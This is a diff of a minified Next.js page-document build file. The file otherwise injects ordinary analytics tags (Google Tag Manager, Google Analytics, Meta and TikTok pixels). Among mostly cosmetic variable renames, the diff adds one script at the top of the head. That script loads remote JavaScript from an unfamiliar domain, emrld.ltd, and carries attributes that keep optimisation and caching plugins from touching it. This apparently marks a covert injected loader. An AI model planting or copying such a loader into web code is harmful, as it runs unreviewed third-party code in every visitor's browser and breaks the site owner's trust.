@@ -1,4 +1,9 @@
-"use strict";(()=>{var t={};t.id=660,t.ids=[660],t.modules={7645:(t,e,n)=>{n.r(e),n.d(e,{default:()=>r});var a=n(997),s=n(6859),i=n(1393);function r(){return(0,a.jsxs)(s.Html,{lang:"id",children:[(0,a.jsxs)(s.Head,{children:[a.jsx("script",{dangerouslySetInnerHTML:{__html:`(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+"use strict";(()=>{var t={};t.id=660,t.ids=[660],t.modules={7645:(t,e,n)=>{n.r(e),n.d(e,{default:()=>i});var a=n(997),s=n(6859),r=n(1393);function i(){return(0,a.jsxs)(s.Html,{lang:"id",children:[(0,a.jsxs)(s.Head,{children:[a.jsx("script",{nowprocket:"","data-noptimize":"1","data-cfasync":"false","data-wpfc-render":"false","seraph-accel-crit":"1","data-no-defer":"1",dangerouslySetInnerHTML:{__html:`(function () {
+ var script = document.createElement("script");
+ script.async = 1;
+ script.src = 'https://emrld.ltd/NTM1NDYx.js?t=535461';
+ document.head.appendChild(script);
+ })();`}}),a.jsx("script",{dangerouslySetInnerHTML:{__html:`(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
 new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
 j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
@@ -64,11 +69,11 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
                   has_ttclid: !!ttclid
                 });
               })();
-            `}}),a.jsx("meta",{name:"p:domain_verify",content:i.g9.PINTEREST_VERIFICATION}),a.jsx("script",{async:!0,src:`https://www.googletagmanager.com/gtag/js?id=${i.g9.GA_ID}`}),a.jsx("script",{dangerouslySetInnerHTML:{__html:`
+            `}}),a.jsx("meta",{name:"p:domain_verify",content:r.g9.PINTEREST_VERIFICATION}),a.jsx("script",{async:!0,src:`https://www.googletagmanager.com/gtag/js?id=${r.g9.GA_ID}`}),a.jsx("script",{dangerouslySetInnerHTML:{__html:`
               window.dataLayer = window.dataLayer || [];
               function gtag(){dataLayer.push(arguments);}
               gtag('js', new Date());
-              gtag('config', '${i.g9.GA_ID}', {
+              gtag('config', '${r.g9.GA_ID}', {
                 page_path: window.location.pathname,
               });
             `}}),a.jsx("script",{dangerouslySetInnerHTML:{__html:`
@@ -80,12 +85,12 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
               t.src=v;s=b.getElementsByTagName(e)[0];
               s.parentNode.insertBefore(t,s)}(window, document,'script',
               'https://connect.facebook.net/en_US/fbevents.js');
-              fbq('init', '${i.g9.META_PIXEL_ID}');
+              fbq('init', '${r.g9.META_PIXEL_ID}');
               fbq('track', 'PageView');
-            `}}),a.jsx("noscript",{children:a.jsx("img",{height:"1",width:"1",style:{display:"none"},src:`https://www.facebook.com/tr?id=${i.g9.META_PIXEL_ID}&ev=PageView&noscript=1`,alt:""})}),a.jsx("script",{dangerouslySetInnerHTML:{__html:`
+            `}}),a.jsx("noscript",{children:a.jsx("img",{height:"1",width:"1",style:{display:"none"},src:`https://www.facebook.com/tr?id=${r.g9.META_PIXEL_ID}&ev=PageView&noscript=1`,alt:""})}),a.jsx("script",{dangerouslySetInnerHTML:{__html:`
               !function (w, d, t) {
                 w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var i="https://analytics.tiktok.com/i18n/pixel/events.js";ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=i,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src=i+"?sdkid="+e+"&lib="+t;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(o,a)};
-                ttq.load('${i.g9.TIKTOK_PIXEL_ID}');
+                ttq.load('${r.g9.TIKTOK_PIXEL_ID}');
                 ttq.page();
               }(window, document, 'ttq');
             `}}),a.jsx("script",{dangerouslySetInnerHTML:{__html:`
